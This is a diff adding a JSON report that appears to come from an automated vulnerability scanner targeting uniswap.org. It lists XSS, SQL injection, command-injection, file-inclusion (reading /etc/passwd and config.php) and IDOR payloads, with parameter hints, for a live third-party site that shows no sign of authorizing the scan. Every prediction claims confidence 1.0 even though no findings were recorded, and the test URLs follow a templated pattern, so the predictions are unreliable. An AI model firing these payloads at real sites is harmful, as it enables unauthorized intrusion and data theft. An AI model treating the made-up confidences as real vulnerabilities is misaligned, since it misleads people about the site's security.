@@ -1,0 +1,88 @@
+{
+  "target": "https://uniswap.org",
+  "timestamp": "2025-12-01T10:14:25.040502",
+  "findings": [],
+  "rl_predictions": [
+    {
+      "type": "xss",
+      "confidence": 1.0,
+      "recommended_payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>"
+      ],
+      "test_url": "https://uniswap.org/vulnerabilities/xss/",
+      "parameter_hint": [
+        "name",
+        "search",
+        "query",
+        "input",
+        "message"
+      ]
+    },
+    {
+      "type": "sqli",
+      "confidence": 1.0,
+      "recommended_payloads": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' UNION SELECT 1,2,3 --"
+      ],
+      "test_url": "https://uniswap.org/vulnerabilities/sqli/",
+      "parameter_hint": [
+        "id",
+        "user_id",
+        "category",
+        "product_id"
+      ]
+    },
+    {
+      "type": "command_injection",
+      "confidence": 1.0,
+      "recommended_payloads": [
+        "127.0.0.1; whoami",
+        "127.0.0.1 | ls",
+        "127.0.0.1 && echo test"
+      ],
+      "test_url": "https://uniswap.org/vulnerabilities/command/injection/",
+      "parameter_hint": [
+        "ip",
+        "host",
+        "cmd",
+        "exec"
+      ]
+    },
+    {
+      "type": "lfi",
+      "confidence": 1.0,
+      "recommended_payloads": [
+        "../../../../../etc/passwd",
+        "php://filter/read=convert.base64-encode/resource=config.php"
+      ],
+      "test_url": "https://uniswap.org/vulnerabilities/lfi/",
+      "parameter_hint": [
+        "file",
+        "page",
+        "document",
+        "template"
+      ]
+    },
+    {
+      "type": "idor",
+      "confidence": 1.0,
+      "recommended_payloads": [
+        "user_id=1",
+        "user_id=2",
+        "user_id=3"
+      ],
+      "test_url": "https://uniswap.org/vulnerabilities/idor/",
+      "parameter_hint": [
+        "user_id",
+        "account",
+        "profile",
+        "id"
+      ]
+    }
+  ],
+  "rl_confidence": 1.0
+}
